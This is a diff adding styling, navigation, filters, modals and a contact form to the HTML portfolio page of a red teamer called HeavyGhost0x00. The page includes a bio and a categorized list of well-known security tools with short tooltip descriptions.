@@ -22,7 +22,6 @@
   }
 
   * { margin: 0; padding: 0; box-sizing: border-box; }
-
   html { scroll-behavior: smooth; }
 
   body {
@@ -42,7 +41,7 @@
     background: var(--accent);
     border-radius: 50%;
     pointer-events: none;
-    z-index: 9999;
+    z-index: 10001;
     transform: translate(-50%, -50%);
     transition: transform 0.05s;
     box-shadow: 0 0 10px var(--accent);
@@ -53,7 +52,7 @@
     border: 1px solid rgba(0,255,136,0.4);
     border-radius: 50%;
     pointer-events: none;
-    z-index: 9998;
+    z-index: 10000;
     transform: translate(-50%, -50%);
     transition: all 0.15s ease;
   }
@@ -77,14 +76,21 @@
     position: fixed;
     inset: 0;
     background: repeating-linear-gradient(
-      0deg,
-      transparent,
-      transparent 2px,
-      rgba(0,0,0,0.05) 2px,
-      rgba(0,0,0,0.05) 4px
+      0deg, transparent, transparent 2px,
+      rgba(0,0,0,0.05) 2px, rgba(0,0,0,0.05) 4px
     );
     pointer-events: none;
     z-index: 1;
+  }
+
+  /* Matrix rain canvas */
+  #matrixCanvas {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    z-index: 0;
+    opacity: 0.06;
+    pointer-events: none;
   }
 
   /* NAV */
@@ -99,6 +105,11 @@
     background: rgba(5,5,8,0.85);
     backdrop-filter: blur(12px);
     border-bottom: 1px solid var(--border);
+    transition: padding 0.3s, background 0.3s;
+  }
+  nav.scrolled {
+    padding: 0.8rem 3rem;
+    background: rgba(5,5,8,0.95);
   }
 
   .nav-logo {
@@ -132,8 +143,31 @@
     background: var(--accent);
     transition: width 0.3s;
   }
-  .nav-links a:hover { color: var(--accent); }
-  .nav-links a:hover::after { width: 100%; }
+  .nav-links a:hover, .nav-links a.active { color: var(--accent); }
+  .nav-links a:hover::after, .nav-links a.active::after { width: 100%; }
+
+  /* Hamburger */
+  .hamburger {
+    display: none;
+    flex-direction: column;
+    gap: 5px;
+    background: none;
+    border: none;
+    cursor: none;
+    padding: 4px;
+    z-index: 101;
+  }
+  .hamburger span {
+    display: block;
+    width: 24px;
+    height: 2px;
+    background: var(--accent);
+    transition: all 0.3s;
+    transform-origin: center;
+  }
+  .hamburger.open span:nth-child(1) { transform: rotate(45deg) translate(5px, 5px); }
+  .hamburger.open span:nth-child(2) { opacity: 0; }
+  .hamburger.open span:nth-child(3) { transform: rotate(-45deg) translate(5px, -5px); }
 
   /* SECTIONS */
   section {
@@ -185,11 +219,26 @@
     font-family: var(--mono);
     font-size: clamp(0.85rem, 2vw, 1.1rem);
     color: var(--accent2);
-    margin-bottom: 2rem;
+    margin-bottom: 0.5rem;
     opacity: 0;
     animation: fadeUp 0.6s ease 0.6s forwards;
   }
   .hero-role .sep { color: var(--text-dim); margin: 0 0.7rem; }
+
+  /* Typing animation */
+  .hero-typing {
+    font-family: var(--mono);
+    font-size: 14px;
+    color: var(--text-dim);
+    margin-bottom: 2rem;
+    min-height: 1.8em;
+    opacity: 0;
+    animation: fadeUp 0.6s ease 0.7s forwards;
+  }
+  .hero-typing .typed-cursor {
+    color: var(--accent);
+    animation: blink 1s step-end infinite;
+  }
 
   .hero-bio {
     max-width: 600px;
@@ -238,14 +287,10 @@
     color: var(--accent2);
   }
 
-  /* terminal blink */
-  .blink {
-    animation: blink 1s step-end infinite;
-    color: var(--accent);
-  }
+  .blink { animation: blink 1s step-end infinite; color: var(--accent); }
   @keyframes blink { 50% { opacity: 0; } }
 
-  /* decorative hex */
+  /* Decorative hex */
   .hero-deco {
     position: absolute;
     right: 6rem;
@@ -343,6 +388,45 @@
   }
 
   /* ARSENAL */
+  .arsenal-filters {
+    display: flex;
+    gap: 0.5rem;
+    margin-bottom: 2rem;
+    flex-wrap: wrap;
+  }
+  .filter-btn {
+    font-family: var(--mono);
+    font-size: 11px;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    padding: 0.5rem 1rem;
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    color: var(--text-dim);
+    cursor: none;
+    transition: all 0.2s;
+  }
+  .filter-btn:hover, .filter-btn.active {
+    border-color: var(--accent);
+    color: var(--accent);
+    background: rgba(0,255,136,0.06);
+  }
+
+  .arsenal-search {
+    width: 100%;
+    margin-bottom: 1.5rem;
+    padding: 0.7rem 1rem;
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: 13px;
+    outline: none;
+    transition: border-color 0.2s;
+  }
+  .arsenal-search::placeholder { color: var(--text-dim); }
+  .arsenal-search:focus { border-color: var(--accent); }
+
   .arsenal-grid {
     display: grid;
     grid-template-columns: repeat(3, 1fr);
@@ -366,11 +450,11 @@
   }
   .arsenal-card:hover { border-color: rgba(0,255,136,0.3); background: rgba(0,255,136,0.03); }
   .arsenal-card:hover::before { height: 100%; }
-
   .arsenal-card.blue::before { background: var(--accent2); }
   .arsenal-card.blue:hover { border-color: rgba(0,204,255,0.3); background: rgba(0,204,255,0.03); }
   .arsenal-card.red::before { background: var(--accent3); }
   .arsenal-card.red:hover { border-color: rgba(255,68,102,0.3); background: rgba(255,68,102,0.03); }
+  .arsenal-card.hidden { display: none; }
 
   .arsenal-icon {
     font-family: var(--mono);
@@ -409,8 +493,24 @@
     border-color: rgba(0,255,136,0.25);
     color: var(--accent);
   }
+  .tool-tag.highlight {
+    background: rgba(0,255,136,0.15);
+    border-color: var(--accent);
+    color: var(--accent);
+  }
 
   /* TECHNIQUES */
+  .ttp-filters {
+    display: flex;
+    gap: 0.5rem;
+    margin-bottom: 1.5rem;
+    flex-wrap: wrap;
+  }
+
+  .ttp-table-wrap {
+    overflow-x: auto;
+  }
+
   .ttp-table {
     width: 100%;
     border-collapse: collapse;
@@ -435,8 +535,27 @@
     color: var(--text);
     vertical-align: middle;
   }
+  .ttp-table tr { transition: opacity 0.3s; }
   .ttp-table tr:hover td { background: rgba(0,255,136,0.02); }
   .ttp-table tr:hover td:first-child { color: var(--accent); }
+  .ttp-table tr.ttp-hidden { display: none; }
+
+  .ttp-detail-btn {
+    font-family: var(--mono);
+    font-size: 10px;
+    padding: 2px 8px;
+    background: rgba(0,255,136,0.08);
+    border: 1px solid rgba(0,255,136,0.2);
+    color: var(--accent);
+    cursor: none;
+    transition: all 0.2s;
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+  }
+  .ttp-detail-btn:hover {
+    background: rgba(0,255,136,0.15);
+    border-color: var(--accent);
+  }
 
   .badge {
     display: inline-block;
@@ -465,6 +584,7 @@
     overflow: hidden;
     text-decoration: none;
     display: block;
+    cursor: none;
   }
   .blog-card::before {
     content: '';
@@ -476,10 +596,8 @@
   }
   .blog-card:hover { border-color: rgba(0,255,136,0.3); background: rgba(0,255,136,0.03); }
   .blog-card:hover::before { height: 100%; }
-  
   .blog-card.blue::before { background: var(--accent2); }
   .blog-card.blue:hover { border-color: rgba(0,204,255,0.3); background: rgba(0,204,255,0.03); }
-  
   .blog-card.red::before { background: var(--accent3); }
   .blog-card.red:hover { border-color: rgba(255,68,102,0.3); background: rgba(255,68,102,0.03); }
 
@@ -495,7 +613,7 @@
   }
   .blog-meta .date { color: var(--accent); }
   .blog-meta .tag { color: var(--accent2); }
-  
+
   .blog-title {
     font-size: 1.25rem;
     font-weight: 600;
@@ -507,14 +625,14 @@
   .blog-card:hover .blog-title { color: var(--accent); }
   .blog-card.blue:hover .blog-title { color: var(--accent2); }
   .blog-card.red:hover .blog-title { color: var(--accent3); }
-  
+
   .blog-excerpt {
     font-size: 0.95rem;
     color: var(--text-dim);
     line-height: 1.6;
     margin-bottom: 1.25rem;
   }
-  
+
   .blog-read-more {
     font-family: var(--mono);
     font-size: 12px;
@@ -527,105 +645,201 @@
   .blog-card.blue:hover .blog-read-more { color: var(--accent2); }
   .blog-card.red:hover .blog-read-more { color: var(--accent3); }
 
-  /* CONTACT */
-  .contact-inner {
-    display: grid;
-    grid-template-columns: 1fr 1fr;
-    gap: 4rem;
-    align-items: center;
+  /* BLOG MODAL */
+  .modal-overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(5,5,8,0.92);
+    backdrop-filter: blur(8px);
+    z-index: 9000;
+    display: none;
+    align-items: flex-start;
+    justify-content: center;
+    overflow-y: auto;
+    padding: 4rem 2rem;
   }
-  .contact-text h3 {
-    font-size: 2.5rem;
-    font-weight: 700;
-    color: #fff;
-    line-height: 1.2;
-    margin-bottom: 1rem;
+  .modal-overlay.open {
+    display: flex;
   }
-  .contact-text h3 span { color: var(--accent); }
-  .contact-text p { color: var(--text-dim); line-height: 1.8; }
 
-  .contact-links {
-    display: flex;
-    flex-direction: column;
-    gap: 1rem;
-  }
-  .contact-link {
-    display: flex;
-    align-items: center;
-    gap: 1rem;
-    padding: 1rem 1.25rem;
+  .modal-content {
     background: var(--bg2);
     border: 1px solid var(--border);
-    text-decoration: none;
-    color: var(--text-dim);
-    transition: all 0.2s;
-    font-family: var(--mono);
-    font-size: 13px;
-  }
-  .contact-link:hover {
-    border-color: rgba(0,255,136,0.3);
-    color: var(--accent);
-    background: rgba(0,255,136,0.04);
-  }
-  .contact-link-icon {
-    width: 32px; height: 32px;
-    background: var(--bg3);
-    border: 1px solid var(--border);
-    display: flex; align-items: center; justify-content: center;
-    font-size: 14px;
+    max-width: 800px;
+    width: 100%;
+    padding: 3rem;
+    position: relative;
+    animation: fadeUp 0.4s ease;
   }
 
-  /* FOOTER */
-  footer {
-    position: relative;
-    z-index: 2;
-    border-top: 1px solid var(--border);
-    padding: 2rem 6rem;
+  .modal-close {
+    position: absolute;
+    top: 1.5rem;
+    right: 1.5rem;
+    background: none;
+    border: 1px solid var(--border);
+    color: var(--text-dim);
+    font-family: var(--mono);
+    font-size: 18px;
+    width: 36px;
+    height: 36px;
     display: flex;
-    justify-content: space-between;
     align-items: center;
+    justify-content: center;
+    cursor: none;
+    transition: all 0.2s;
   }
-  footer p {
+  .modal-close:hover {
+    border-color: var(--accent3);
+    color: var(--accent3);
+  }
+
+  .modal-tag {
     font-family: var(--mono);
     font-size: 11px;
-    color: var(--text-dim);
-    letter-spacing: 0.05em;
+    color: var(--accent2);
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    margin-bottom: 0.5rem;
   }
-  footer .accent { color: var(--accent); }
-
-  /* ANIMATIONS */
-  @keyframes fadeUp {
-    from { opacity: 0; transform: translateY(20px); }
-    to { opacity: 1; transform: translateY(0); }
-  }
-  @keyframes fadeIn {
-    from { opacity: 0; }
-    to { opacity: 1; }
-  }
-
-  .reveal {
-    opacity: 0;
-    transform: translateY(24px);
-    transition: opacity 0.7s ease, transform 0.7s ease;
-  }
-  .reveal.visible { opacity: 1; transform: translateY(0); }
-
-  /* TERMINAL LINE */
-  .terminal-line {
+  .modal-date {
     font-family: var(--mono);
-    font-size: 13px;
-    color: var(--text-dim);
-    margin-bottom: 3rem;
-    padding: 1rem 1.25rem;
-    background: var(--bg2);
-    border-left: 2px solid var(--accent);
-    border-top: 1px solid var(--border);
-    border-right: 1px solid var(--border);
+    font-size: 11px;
+    color: var(--accent);
+    letter-spacing: 0.1em;
+    margin-bottom: 1.5rem;
+  }
+  .modal-title {
+    font-family: var(--sans);
+    font-size: 2rem;
+    font-weight: 700;
+    color: #fff;
+    margin-bottom: 2rem;
+    line-height: 1.2;
+    padding-bottom: 1.5rem;
     border-bottom: 1px solid var(--border);
   }
-  .terminal-line .prompt { color: var(--accent); margin-right: 0.5rem; }
-  .terminal-line .cmd { color: var(--accent2); }
-  .terminal-line .output { color: var(--text-dim); display: block; margin-top: 4px; padding-left: 1.2rem; }
+  .modal-body {
+    color: var(--text-dim);
+    line-height: 1.9;
+    font-size: 1.05rem;
+  }
+  .modal-body h3 {
+    color: var(--accent);
+    font-family: var(--mono);
+    font-size: 14px;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    margin: 2rem 0 0.75rem;
+  }
+  .modal-body p {
+    margin-bottom: 1rem;
+  }
+  .modal-body code {
+    font-family: var(--mono);
+    font-size: 13px;
+    background: rgba(0,255,136,0.06);
+    border: 1px solid rgba(0,255,136,0.12);
+    padding: 2px 6px;
+    color: var(--accent);
+  }
+  .modal-body pre {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--accent);
+    padding: 1rem 1.25rem;
+    margin: 1rem 0 1.5rem;
+    overflow-x: auto;
+    font-family: var(--mono);
+    font-size: 13px;
+    color: var(--text);
+    line-height: 1.7;
+  }
+  .modal-body ul {
+    margin: 0.5rem 0 1rem 1.5rem;
+    color: var(--text-dim);
+  }
+  .modal-body ul li {
+    margin-bottom: 0.4rem;
+  }
+  .modal-body ul li::marker {
+    color: var(--accent);
+  }
+
+  /* TTP DETAIL MODAL */
+  .ttp-modal-overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(5,5,8,0.92);
+    backdrop-filter: blur(8px);
+    z-index: 9000;
+    display: none;
+    align-items: center;
+    justify-content: center;
+    padding: 2rem;
+  }
+  .ttp-modal-overlay.open { display: flex; }
+  .ttp-modal-content {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    max-width: 650px;
+    width: 100%;
+    padding: 2.5rem;
+    position: relative;
+    animation: fadeUp 0.4s ease;
+  }
+  .ttp-modal-content h2 {
+    font-family: var(--sans);
+    font-size: 1.5rem;
+    color: #fff;
+    margin-bottom: 0.5rem;
+  }
+  .ttp-modal-content .ttp-mitre {
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--accent);
+    margin-bottom: 1.5rem;
+    letter-spacing: 0.1em;
+  }
+  .ttp-modal-content .ttp-desc {
+    color: var(--text-dim);
+    line-height: 1.8;
+    margin-bottom: 1.5rem;
+  }
+  .ttp-modal-content .ttp-info-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 1rem;
+    margin-bottom: 1.5rem;
+  }
+  .ttp-info-box {
+    padding: 1rem;
+    background: var(--bg);
+    border: 1px solid var(--border);
+  }
+  .ttp-info-box .label {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    margin-bottom: 0.4rem;
+  }
+  .ttp-info-box .value {
+    font-size: 0.95rem;
+    color: var(--text);
+  }
+  .ttp-modal-content pre {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--accent);
+    padding: 1rem;
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--text);
+    line-height: 1.7;
+    overflow-x: auto;
+  }
 
   /* CERTIFICATIONS */
   .certs-grid {
@@ -712,35 +926,330 @@
   }
   .cert-issuer span { color: var(--text); }
 
+  /* CONTACT */
+  .contact-inner {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 4rem;
+    align-items: start;
+  }
+  .contact-text h3 {
+    font-size: 2.5rem;
+    font-weight: 700;
+    color: #fff;
+    line-height: 1.2;
+    margin-bottom: 1rem;
+  }
+  .contact-text h3 span { color: var(--accent); }
+  .contact-text p { color: var(--text-dim); line-height: 1.8; margin-bottom: 2rem; }
+
+  .contact-links {
+    display: flex;
+    flex-direction: column;
+    gap: 1rem;
+    margin-bottom: 2rem;
+  }
+  .contact-link {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    padding: 1rem 1.25rem;
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    text-decoration: none;
+    color: var(--text-dim);
+    transition: all 0.2s;
+    font-family: var(--mono);
+    font-size: 13px;
+  }
+  .contact-link:hover {
+    border-color: rgba(0,255,136,0.3);
+    color: var(--accent);
+    background: rgba(0,255,136,0.04);
+  }
+  .contact-link-icon {
+    width: 32px; height: 32px;
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 14px;
+    flex-shrink: 0;
+  }
+
+  /* CONTACT FORM */
+  .contact-form {
+    display: flex;
+    flex-direction: column;
+    gap: 1rem;
+  }
+  .contact-form label {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text-dim);
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+  }
+  .contact-form input,
+  .contact-form textarea {
+    width: 100%;
+    padding: 0.75rem 1rem;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: 13px;
+    outline: none;
+    transition: border-color 0.2s;
+    resize: vertical;
+  }
+  .contact-form input:focus,
+  .contact-form textarea:focus {
+    border-color: var(--accent);
+  }
+  .contact-form textarea {
+    min-height: 100px;
+  }
+  .contact-form .form-row {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 1rem;
+  }
+  .form-group {
+    display: flex;
+    flex-direction: column;
+    gap: 0.4rem;
+  }
+  .form-submit {
+    font-family: var(--mono);
+    font-size: 12px;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    padding: 0.85rem 2rem;
+    background: var(--accent);
+    color: #000;
+    border: 1px solid var(--accent);
+    cursor: none;
+    transition: all 0.2s;
+    align-self: flex-start;
+  }
+  .form-submit:hover {
+    background: transparent;
+    color: var(--accent);
+    box-shadow: 0 0 20px rgba(0,255,136,0.3);
+  }
+  .form-status {
+    font-family: var(--mono);
+    font-size: 12px;
+    padding: 0.75rem 1rem;
+    display: none;
+  }
+  .form-status.success {
+    display: block;
+    color: var(--accent);
+    background: rgba(0,255,136,0.06);
+    border: 1px solid rgba(0,255,136,0.2);
+  }
+  .form-status.error {
+    display: block;
+    color: var(--accent3);
+    background: rgba(255,68,102,0.06);
+    border: 1px solid rgba(255,68,102,0.2);
+  }
+
+  /* BACK TO TOP */
+  .back-to-top {
+    position: fixed;
+    bottom: 2rem;
+    right: 2rem;
+    width: 44px;
+    height: 44px;
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    color: var(--accent);
+    font-family: var(--mono);
+    font-size: 18px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: none;
+    z-index: 99;
+    opacity: 0;
+    visibility: hidden;
+    transform: translateY(10px);
+    transition: all 0.3s;
+    text-decoration: none;
+  }
+  .back-to-top.visible {
+    opacity: 1;
+    visibility: visible;
+    transform: translateY(0);
+  }
+  .back-to-top:hover {
+    background: rgba(0,255,136,0.1);
+    border-color: var(--accent);
+    box-shadow: 0 0 15px rgba(0,255,136,0.2);
+  }
+
+  /* FOOTER */
+  footer {
+    position: relative;
+    z-index: 2;
+    border-top: 1px solid var(--border);
+    padding: 2rem 6rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+  footer p {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text-dim);
+    letter-spacing: 0.05em;
+  }
+  footer .accent { color: var(--accent); }
+
+  /* ANIMATIONS */
+  @keyframes fadeUp {
+    from { opacity: 0; transform: translateY(20px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+  @keyframes fadeIn {
+    from { opacity: 0; }
+    to { opacity: 1; }
+  }
+
+  .reveal {
+    opacity: 0;
+    transform: translateY(24px);
+    transition: opacity 0.7s ease, transform 0.7s ease;
+  }
+  .reveal.visible { opacity: 1; transform: translateY(0); }
+
+  /* TERMINAL LINE */
+  .terminal-line {
+    font-family: var(--mono);
+    font-size: 13px;
+    color: var(--text-dim);
+    margin-bottom: 3rem;
+    padding: 1rem 1.25rem;
+    background: var(--bg2);
+    border-left: 2px solid var(--accent);
+    border-top: 1px solid var(--border);
+    border-right: 1px solid var(--border);
+    border-bottom: 1px solid var(--border);
+  }
+  .terminal-line .prompt { color: var(--accent); margin-right: 0.5rem; }
+  .terminal-line .cmd { color: var(--accent2); }
+  .terminal-line .output { color: var(--text-dim); display: block; margin-top: 4px; padding-left: 1.2rem; }
+
+  /* Progress bar for certs */
+  .cert-progress {
+    margin-top: 0.75rem;
+    height: 3px;
+    background: rgba(255,255,255,0.05);
+    border-radius: 2px;
+    overflow: hidden;
+  }
+  .cert-progress-bar {
+    height: 100%;
+    background: rgba(255,180,0,0.7);
+    border-radius: 2px;
+    transition: width 1.5s ease;
+    width: 0;
+  }
+
+  /* RESPONSIVE */
   @media (max-width: 768px) {
+    .hamburger { display: flex; }
+    .nav-links {
+      position: fixed;
+      top: 0;
+      right: -100%;
+      width: 70%;
+      max-width: 300px;
+      height: 100vh;
+      background: var(--bg);
+      border-left: 1px solid var(--border);
+      flex-direction: column;
+      padding: 5rem 2rem 2rem;
+      gap: 0;
+      transition: right 0.4s ease;
+      z-index: 100;
+    }
+    .nav-links.open { right: 0; }
+    .nav-links li {
+      border-bottom: 1px solid rgba(255,255,255,0.04);
+    }
+    .nav-links a {
+      display: block;
+      padding: 1rem 0;
+      font-size: 14px;
+    }
+    .nav-links a::after { display: none; }
+    .mobile-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.5);
+      z-index: 99;
+    }
+    .mobile-overlay.open { display: block; }
+
     .certs-grid { grid-template-columns: 1fr; }
     .blog-grid { grid-template-columns: 1fr; }
     #hero { padding-left: 1.5rem; padding-right: 1.5rem; }
     .hero-deco { display: none; }
     nav { padding: 1rem 1.5rem; }
-    .nav-links { gap: 1.5rem; }
     section { padding: 4rem 1.5rem; }
     .about-grid, .contact-inner { grid-template-columns: 1fr; }
     .arsenal-grid { grid-template-columns: 1fr; }
     footer { padding: 1.5rem; flex-direction: column; gap: 0.5rem; text-align: center; }
+    .contact-form .form-row { grid-template-columns: 1fr; }
+    .modal-content { padding: 2rem 1.5rem; }
+    .ttp-modal-content .ttp-info-grid { grid-template-columns: 1fr; }
+  }
+
+  /* Tooltip for tool tags */
+  .tool-tag {
+    position: relative;
+  }
+  .tool-tag[data-tip]:hover::after {
+    content: attr(data-tip);
+    position: absolute;
+    bottom: calc(100% + 8px);
+    left: 50%;
+    transform: translateX(-50%);
+    background: var(--bg);
+    border: 1px solid var(--border);
+    padding: 4px 10px;
+    font-size: 10px;
+    color: var(--text);
+    white-space: nowrap;
+    z-index: 50;
+    pointer-events: none;
   }
 </style>
 </head>
 <body>
 
+<canvas id="matrixCanvas"></canvas>
 <div class="cursor" id="cursor"></div>
 <div class="cursor-ring" id="cursor-ring"></div>
+<div class="mobile-overlay" id="mobileOverlay"></div>
 
 <!-- NAV -->
-<nav>
+<nav id="mainNav">
   <div class="nav-logo"><span>//</span> HeavyGhost<span style="color:var(--accent)">0x00</span></div>
-  <ul class="nav-links">
-    <li><a href="#about">About</a></li>
-    <li><a href="#arsenal">Arsenal</a></li>
-    <li><a href="#techniques">TTPs</a></li>
-    <li><a href="#certs">Certs</a></li>
-    <li><a href="#blog">Blog</a></li>
-    <li><a href="#contact">Contact</a></li>
+  <button class="hamburger" id="hamburger" aria-label="Toggle menu">
+    <span></span><span></span><span></span>
+  </button>
+  <ul class="nav-links" id="navLinks">
+    <li><a href="#about" class="nav-link">About</a></li>
+    <li><a href="#arsenal" class="nav-link">Arsenal</a></li>
+    <li><a href="#techniques" class="nav-link">TTPs</a></li>
+    <li><a href="#certs" class="nav-link">Certs</a></li>
+    <li><a href="#blog" class="nav-link">Blog</a></li>
+    <li><a href="#contact" class="nav-link">Contact</a></li>
   </ul>
 </nav>
 
@@ -754,6 +1263,9 @@
     <p class="hero-role">
       Active Directory Security<span class="sep">/</span>Red Teaming<span class="sep">/</span>Web Penetration Testing
     </p>
+    <div class="hero-typing">
+      <span id="typedText"></span><span class="typed-cursor">|</span>
+    </div>
     <p class="hero-bio">
       Adversary simulation specialist focused on Active Directory exploitation, C2 infrastructure, and web application security. Operating in the shadows of enterprise networks — finding the paths defenders miss.
     </p>
@@ -762,7 +1274,6 @@
       <a href="#contact" class="btn btn-secondary">Get in Touch</a>
     </div>
 
-    <!-- decorative hex grid -->
     <div class="hero-deco">
       <div class="hex-grid" id="hexGrid"></div>
     </div>
@@ -780,7 +1291,7 @@
     <div class="about-text reveal">
       <div class="terminal-line">
         <span class="prompt">ghost@redteam:~$</span><span class="cmd">whoami</span>
-        <span class="output">Red Teamer · AD Specialist · Web Sec Researcher</span>
+        <span class="output">Red Teamer &middot; AD Specialist &middot; Web Sec Researcher</span>
       </div>
       <p>I specialize in <strong>adversary simulation</strong> — emulating real-world threat actors to expose the gaps in enterprise security posture before attackers do.</p>
       <p>My primary domain is <strong>Active Directory</strong>: privilege escalation paths, Kerberos abuse, ACL exploitation, and domain persistence. I combine AD tradecraft with <strong>Sliver C2</strong> for realistic engagements.</p>
@@ -789,7 +1300,7 @@
     <div class="reveal">
       <div class="stat-grid">
         <div class="stat-box">
-          <div class="stat-num">AD</div>
+          <div class="stat-num counter" data-target="AD">AD</div>
           <div class="stat-label">Primary Focus</div>
         </div>
         <div class="stat-box">
@@ -816,76 +1327,91 @@
     <h2 class="section-title">Arsenal</h2>
     <div class="section-line"></div>
   </div>
+
+  <div class="reveal">
+    <input type="text" class="arsenal-search" id="arsenalSearch" placeholder="$ search tools...">
+  </div>
+
+  <div class="arsenal-filters reveal">
+    <button class="filter-btn active" data-filter="all">All</button>
+    <button class="filter-btn" data-filter="c2">C2</button>
+    <button class="filter-btn" data-filter="ad">Active Directory</button>
+    <button class="filter-btn" data-filter="web">Web Security</button>
+    <button class="filter-btn" data-filter="recon">Recon</button>
+    <button class="filter-btn" data-filter="lang">Languages</button>
+    <button class="filter-btn" data-filter="platform">Platform</button>
+  </div>
+
   <div class="arsenal-grid">
-    <div class="arsenal-card reveal">
+    <div class="arsenal-card reveal" data-category="c2">
       <div class="arsenal-icon">// C2 &amp; Post-Exploitation</div>
       <div class="arsenal-title">Command &amp; Control</div>
       <div class="tool-list">
-        <span class="tool-tag primary">Sliver</span>
-        <span class="tool-tag">Metasploit</span>
-        <span class="tool-tag">Cobalt Strike</span>
-        <span class="tool-tag">Havoc</span>
-        <span class="tool-tag">Villain</span>
+        <span class="tool-tag primary" data-tip="Primary C2 framework">Sliver</span>
+        <span class="tool-tag" data-tip="Exploitation framework">Metasploit</span>
+        <span class="tool-tag" data-tip="Commercial C2">Cobalt Strike</span>
+        <span class="tool-tag" data-tip="Open-source C2">Havoc</span>
+        <span class="tool-tag" data-tip="Backdoor generator">Villain</span>
       </div>
     </div>
-    <div class="arsenal-card blue reveal">
-      <div class="arsenal-icon" style="color:var(--accent2);">// Active Directory</div>
+    <div class="arsenal-card blue reveal" data-category="ad">
+      <div class="arsenal-icon">// Active Directory</div>
       <div class="arsenal-title">AD Exploitation</div>
       <div class="tool-list">
-        <span class="tool-tag primary" style="background:rgba(0,204,255,0.08);border-color:rgba(0,204,255,0.25);color:var(--accent2)">BloodHound</span>
-        <span class="tool-tag">Impacket</span>
-        <span class="tool-tag">CrackMapExec</span>
-        <span class="tool-tag">Rubeus</span>
-        <span class="tool-tag">Mimikatz</span>
-        <span class="tool-tag">PowerView</span>
-        <span class="tool-tag">Kerbrute</span>
-        <span class="tool-tag">Responder</span>
+        <span class="tool-tag primary" style="background:rgba(0,204,255,0.08);border-color:rgba(0,204,255,0.25);color:var(--accent2)" data-tip="AD attack path mapping">BloodHound</span>
+        <span class="tool-tag" data-tip="Python AD toolkit">Impacket</span>
+        <span class="tool-tag" data-tip="Network enumeration">CrackMapExec</span>
+        <span class="tool-tag" data-tip="Kerberos abuse">Rubeus</span>
+        <span class="tool-tag" data-tip="Credential extraction">Mimikatz</span>
+        <span class="tool-tag" data-tip="AD enumeration">PowerView</span>
+        <span class="tool-tag" data-tip="Kerberos bruteforce">Kerbrute</span>
+        <span class="tool-tag" data-tip="LLMNR/NBT-NS poisoning">Responder</span>
       </div>
     </div>
-    <div class="arsenal-card red reveal">
-      <div class="arsenal-icon" style="color:var(--accent3);">// Web Security</div>
+    <div class="arsenal-card red reveal" data-category="web">
+      <div class="arsenal-icon">// Web Security</div>
       <div class="arsenal-title">Web Penetration</div>
       <div class="tool-list">
-        <span class="tool-tag primary" style="background:rgba(255,68,102,0.08);border-color:rgba(255,68,102,0.25);color:var(--accent3)">Burp Suite</span>
-        <span class="tool-tag">FFUF</span>
-        <span class="tool-tag">Nikto</span>
-        <span class="tool-tag">SQLmap</span>
-        <span class="tool-tag">Feroxbuster</span>
-        <span class="tool-tag">Nuclei</span>
+        <span class="tool-tag primary" style="background:rgba(255,68,102,0.08);border-color:rgba(255,68,102,0.25);color:var(--accent3)" data-tip="Web proxy & scanner">Burp Suite</span>
+        <span class="tool-tag" data-tip="Web fuzzer">FFUF</span>
+        <span class="tool-tag" data-tip="Web server scanner">Nikto</span>
+        <span class="tool-tag" data-tip="SQL injection tool">SQLmap</span>
+        <span class="tool-tag" data-tip="Directory brute-forcer">Feroxbuster</span>
+        <span class="tool-tag" data-tip="Vulnerability scanner">Nuclei</span>
       </div>
     </div>
-    <div class="arsenal-card reveal">
+    <div class="arsenal-card reveal" data-category="recon">
       <div class="arsenal-icon">// Recon &amp; OSINT</div>
       <div class="arsenal-title">Reconnaissance</div>
       <div class="tool-list">
-        <span class="tool-tag">Nmap</span>
-        <span class="tool-tag">Netexec</span>
-        <span class="tool-tag">Amass</span>
-        <span class="tool-tag">theHarvester</span>
-        <span class="tool-tag">Shodan</span>
-        <span class="tool-tag">Subfinder</span>
+        <span class="tool-tag" data-tip="Port scanner">Nmap</span>
+        <span class="tool-tag" data-tip="Network execution">Netexec</span>
+        <span class="tool-tag" data-tip="Subdomain enumeration">Amass</span>
+        <span class="tool-tag" data-tip="Email/domain harvester">theHarvester</span>
+        <span class="tool-tag" data-tip="Internet-wide scanner">Shodan</span>
+        <span class="tool-tag" data-tip="Subdomain discovery">Subfinder</span>
       </div>
     </div>
-    <div class="arsenal-card blue reveal">
-      <div class="arsenal-icon" style="color:var(--accent2);">// Languages</div>
+    <div class="arsenal-card blue reveal" data-category="lang">
+      <div class="arsenal-icon">// Languages</div>
       <div class="arsenal-title">Scripting &amp; Dev</div>
       <div class="tool-list">
